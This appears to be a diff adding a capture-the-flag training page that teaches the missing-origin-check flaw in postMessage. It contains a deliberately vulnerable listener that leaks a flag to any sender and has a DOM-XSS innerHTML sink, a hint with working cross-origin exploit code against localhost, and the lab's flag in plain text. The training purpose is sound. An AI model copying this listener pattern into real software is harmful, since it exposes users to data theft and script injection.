@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>X3 — postMessage Missing Origin Check | Hunt Labs</title>
+  <link rel="stylesheet" href="assets/style.css" />
+</head>
+<body>
+
+<!-- !! The flag is embedded in the page — the widget will return it !! -->
+<script>
+  window.__FLAG__ = 'HUNT{postmessage_needs_an_origin_check}';
+</script>
+
+<!-- ── Nav ─────────────────────────────────────────────── -->
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">[ HUNT ]</a>
+    <div class="nav-links">
+      <a href="index.html">Hub</a>
+      <a href="x3.html" class="active">X3</a>
+      <a href="x3_interview.html">Interview Prep</a>
+    </div>
+    <div class="nav-counter" id="solved-counter">
+      <span class="solved-num">0</span> / 5 solved
+    </div>
+  </div>
+</nav>
+
+<!-- ── Solved Banner ─────────────────────────────────────── -->
+<div class="solved-banner" id="solved-banner">
+  <span class="confetti">&#127881;</span>
+  Lab X3 Solved — postMessage origin check bypassed!
+  <span class="confetti">&#127881;</span>
+</div>
+
+<!-- ── Lab Page ──────────────────────────────────────────── -->
+<div class="lab-page">
+
+  <!-- ════════ MAIN COLUMN ════════ -->
+  <div class="lab-main">
+
+    <!-- Lab Header -->
+    <div class="lab-header">
+      <div class="lab-header-badges">
+        <span class="badge badge-lab">LAB X3</span>
+        <span class="badge badge-intermediate">Intermediate</span>
+      </div>
+      <h1>postMessage — Missing Origin Check</h1>
+      <p class="lab-header-desc">
+        This page hosts a widget that receives <code>postMessage</code> events without
+        verifying <code>event.origin</code>. Any window — including one on a different
+        origin — can send it a <code>getProfile</code> message and receive the flag in the reply.
+        A <code>render</code> message triggers DOM-XSS by setting <code>innerHTML</code> directly.
+      </p>
+      <div class="lab-header-actions">
+        <a href="x3_interview.html" class="btn btn-ghost btn-sm">&#128218; Interview Prep</a>
+        <a href="index.html" class="btn btn-ghost btn-sm">&#8592; Hub</a>
+      </div>
+      <div class="lab-header-meta">
+        <span>&#128363; Interview relevance:
+          <span class="stars">
+            <span class="star">★</span><span class="star">★</span><span class="star">★</span>
+            <span class="star empty">☆</span><span class="star empty">☆</span>
+          </span>
+        </span>
+        <span>&#128269; Hunt frequency:
+          <span class="stars">
+            <span class="star">★</span><span class="star">★</span><span class="star">★</span>
+            <span class="star">★</span><span class="star empty">☆</span>
+          </span>
+        </span>
+      </div>
+    </div>
+
+    <!-- Widget Panel -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#128257;</span>
+        <span class="panel-title">Live Widget — postMessage Listener</span>
+      </div>
+      <div class="panel-body">
+        <p>
+          This widget is always listening. Send it a message from the browser console
+          on this page to test it, or open it from the attacker origin to exploit it.
+        </p>
+
+        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px;">
+          <button class="btn btn-primary btn-sm" id="btn-send-profile">
+            &#9654; Send {type:"getProfile"} locally
+          </button>
+          <button class="btn btn-ghost btn-sm" id="btn-send-render">
+            &#9654; Send {type:"render"} (DOM-XSS demo)
+          </button>
+          <button class="btn btn-danger btn-sm" id="btn-clear-log">
+            &#10005; Clear widget log
+          </button>
+        </div>
+
+        <div style="font-size:12px;color:var(--text-muted);margin-bottom:6px;font-family:var(--mono);">Widget Output / Message Log</div>
+        <div class="terminal" id="widget-log" style="min-height:120px;max-height:280px;overflow-y:auto;">
+          <span class="hl-subtle">// Waiting for postMessage events…</span>
+        </div>
+
+        <div style="margin-top:14px;font-size:12px;color:var(--text-muted);margin-bottom:6px;font-family:var(--mono);">
+          render target (innerHTML sink)
+        </div>
+        <div id="render-target" style="
+          background: var(--surface-2);
+          border: 1px dashed var(--border);
+          border-radius: var(--radius);
+          padding: 12px;
+          min-height: 40px;
+          font-size: 13px;
+          color: var(--text-muted);
+          font-style: italic;
+        ">Nothing rendered yet.</div>
+
+        <div id="widget-alert" class="alert" style="margin-top:10px;"></div>
+      </div>
+    </div>
+
+    <!-- Vulnerable Source -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#128220;</span>
+        <span class="panel-title">Vulnerable Listener Code</span>
+      </div>
+      <div class="panel-body">
+        <pre><code><span class="hl-subtle">// This code runs on the victim page (x3.html)</span>
+
+window.__FLAG__ = <span class="hl-orange">'HUNT{postmessage_needs_an_origin_check}'</span>;
+
+window.addEventListener(<span class="hl-orange">'message'</span>, (event) =&gt; {
+  <span class="hl-subtle">// BUG: no event.origin check — any window can send messages</span>
+  <span class="hl-subtle">// SAFE version: if (event.origin !== 'http://localhost:3000') return;</span>
+
+  <span class="hl-kw">let</span> msg;
+  <span class="hl-kw">try</span> { msg = <span class="hl-blue">JSON</span>.parse(event.data); }
+  <span class="hl-kw">catch</span> { <span class="hl-kw">return</span>; }
+
+  <span class="hl-kw">if</span> (msg.type === <span class="hl-orange">'getProfile'</span>) {
+    <span class="hl-subtle">// BUG: sends flag to any origin using targetOrigin '*'</span>
+    event.source.postMessage(
+      <span class="hl-blue">JSON</span>.stringify({ flag: window.__FLAG__, user: <span class="hl-orange">'victim'</span> }),
+      <span class="hl-orange">'*'</span>   <span class="hl-subtle">← should be the expected origin, not '*'</span>
+    );
+  }
+
+  <span class="hl-kw">if</span> (msg.type === <span class="hl-orange">'render'</span>) {
+    <span class="hl-subtle">// BUG: DOM-XSS — unsanitised HTML from any message sender</span>
+    document.getElementById(<span class="hl-orange">'render-target'</span>).innerHTML = msg.html;
+  }
+});</code></pre>
+      </div>
+    </div>
+
+    <!-- Objective -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#127919;</span>
+        <span class="panel-title">Objective</span>
+      </div>
+      <div class="panel-body">
+        <ul class="objective-list">
+          <li>
+            <span class="obj-num">1</span>
+            <span>Use the buttons above to observe the widget receiving messages locally. Note that it replies with the flag to <em>any</em> sender.</span>
+          </li>
+          <li>
+            <span class="obj-num">2</span>
+            <span>Open <a href="http://localhost:3001/x3.html" target="_blank" rel="noopener">http://localhost:3001/x3.html</a> (attacker origin). It will open a reference to this page via <code>window.open()</code>, then <code>postMessage</code> <code>{type:"getProfile"}</code>.</span>
+          </li>
+          <li>
+            <span class="obj-num">3</span>
+            <span>The reply arrives at the attacker page (no SOP block on <code>postMessage</code> itself) — read the flag and submit below.</span>
+          </li>
+        </ul>
+        <div style="margin-top:14px;padding:12px;background:rgba(210,153,34,0.08);border:1px solid rgba(210,153,34,0.2);border-radius:var(--radius);font-size:13px;color:var(--yellow);">
+          <strong>Tip:</strong> You can also test from the browser console on this page:
+          <br/><code>window.postMessage(JSON.stringify({type:'getProfile'}), '*')</code>
+          <br/>and listen with:
+          <br/><code>window.addEventListener('message', e => console.log(e.data))</code>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /lab-main -->
+
+  <!-- ════════ SIDEBAR ════════ -->
+  <div class="lab-sidebar">
+
+    <!-- Flag Submission -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#127937;</span>
+        <span class="panel-title">Submit Flag</span>
+      </div>
+      <div class="panel-body">
+        <form class="flag-form" id="flag-form">
+          <input
+            type="text"
+            class="flag-input"
+            id="flag-input"
+            placeholder="HUNT{...}"
+            autocomplete="off"
+            spellcheck="false"
+          />
+          <button type="submit" class="btn btn-primary btn-full">Submit Flag</button>
+        </form>
+        <div id="flag-alert" class="alert"></div>
+      </div>
+    </div>
+
+    <!-- Hints -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#128161;</span>
+        <span class="panel-title">Hints</span>
+      </div>
+      <div class="panel-body">
+        <div class="hints-list">
+
+          <div class="hint-item" data-hint="1">
+            <div class="hint-header">
+              <div class="hint-header-left">
+                <span class="hint-number">#1</span>
+                <span>No origin check</span>
+              </div>
+              <button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button>
+            </div>
+            <div class="hint-content">
+              The victim page listens for <code>message</code> events from any window.
+              Does it check <code>event.origin</code> before responding?
+            </div>
+          </div>
+
+          <div class="hint-item" data-hint="2">
+            <div class="hint-header">
+              <div class="hint-header-left">
+                <span class="hint-number">#2</span>
+                <span>Cross-origin window reference</span>
+              </div>
+              <button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button>
+            </div>
+            <div class="hint-content">
+              Open the victim page in one tab. From the attacker origin (<code>:3001</code>),
+              open a reference to the victim window using <code>window.open()</code>.
+              Then <code>postMessage</code> the message type the widget responds to.
+            </div>
+          </div>
+
+          <div class="hint-item" data-hint="3">
+            <div class="hint-header">
+              <div class="hint-header-left">
+                <span class="hint-number">#3</span>
+                <span>The exploit code</span>
+              </div>
+              <button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button>
+            </div>
+            <div class="hint-content">
+              From <code>attacker/public/x3.html</code>, run:<br/><br/>
+              <code style="display:block;word-break:break-all;">
+                const win = window.open('http://localhost:3000/x3.html');<br/>
+                setTimeout(() =&gt; win.postMessage(JSON.stringify({type:'getProfile'}), '*'), 1000);<br/>
+                window.addEventListener('message', e =&gt; { /* display e.data */ });
+              </code>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <!-- Payload Log -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#128196;</span>
+        <span class="panel-title">Payload Log</span>
+        <button
+          class="btn btn-ghost btn-sm"
+          style="margin-left:auto;"
+          onclick="localStorage.removeItem('huntlabs_xo_log_x3'); HuntLabs.renderPayloadLog('x3');"
+        >Clear</button>
+      </div>
+      <div class="panel-body" style="padding:12px;">
+        <div id="payload-log">
+          <div class="log-empty">No payloads logged yet.</div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /lab-sidebar -->
+
+</div><!-- /lab-page -->
+
+<script src="assets/main.js"></script>
+<script>
+  const LAB_ID        = 'x3';
+  const EXPECTED_FLAG = 'HUNT{postmessage_needs_an_origin_check}';
+
+  /* ── Vulnerable widget listener ─── */
+  const logEntries = [];
+
+  function appendWidgetLog(text, cls) {
+    logEntries.push({ text, cls });
+    const el = document.getElementById('widget-log');
+    if (!el) return;
+    el.innerHTML = logEntries.slice(-30).map(e =>
+      `<div style="margin-bottom:4px;"><span class="${e.cls || ''}">${HuntLabs.escHtml(e.text)}</span></div>`
+    ).join('');
+    el.scrollTop = el.scrollHeight;
+  }
+
+  window.addEventListener('message', (event) => {
+    let msg;
+    try { msg = JSON.parse(event.data); }
+    catch { return; }
+
+    appendWidgetLog(`[${new Date().toLocaleTimeString()}] Received from ${event.origin}: ${event.data}`, 'hl-blue');
+
+    if (msg.type === 'getProfile') {
+      const reply = JSON.stringify({ flag: window.__FLAG__, user: 'victim' });
+      if (event.source) {
+        event.source.postMessage(reply, '*');
+        appendWidgetLog(`[widget] Replied with flag to ${event.origin} (targetOrigin='*')`, 'hl-red');
+      }
+      HuntLabs.logPayload(LAB_ID, msg.type + ' → flag leaked', 'postMessage event');
+      HuntLabs.renderPayloadLog(LAB_ID);
+    }
+
+    if (msg.type === 'render') {
+      const target = document.getElementById('render-target');
+      if (target && msg.html) {
+        target.innerHTML = msg.html;  // intentional DOM-XSS sink
+        appendWidgetLog(`[widget] Rendered HTML from ${event.origin}: ${msg.html}`, 'hl-yellow');
+      }
+      HuntLabs.logPayload(LAB_ID, 'render:' + (msg.html || ''), 'DOM-XSS via postMessage');
+      HuntLabs.renderPayloadLog(LAB_ID);
+    }
+  });
+
+  document.addEventListener('DOMContentLoaded', () => {
+    HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG);
+
+    document.getElementById('btn-send-profile').addEventListener('click', () => {
+      window.postMessage(JSON.stringify({ type: 'getProfile' }), '*');
+    });
+
+    document.getElementById('btn-send-render').addEventListener('click', () => {
+      const payload = '<strong style="color:var(--green)">XSS demo — innerHTML sink hit from same origin</strong>';
+      window.postMessage(JSON.stringify({ type: 'render', html: payload }), '*');
+    });
+
+    document.getElementById('btn-clear-log').addEventListener('click', () => {
+      logEntries.length = 0;
+      const el = document.getElementById('widget-log');
+      if (el) el.innerHTML = '<span class="hl-subtle">// Log cleared — waiting for postMessage events…</span>';
+      document.getElementById('render-target').textContent = 'Nothing rendered yet.';
+    });
+  });
+</script>
+</body>
+</html>
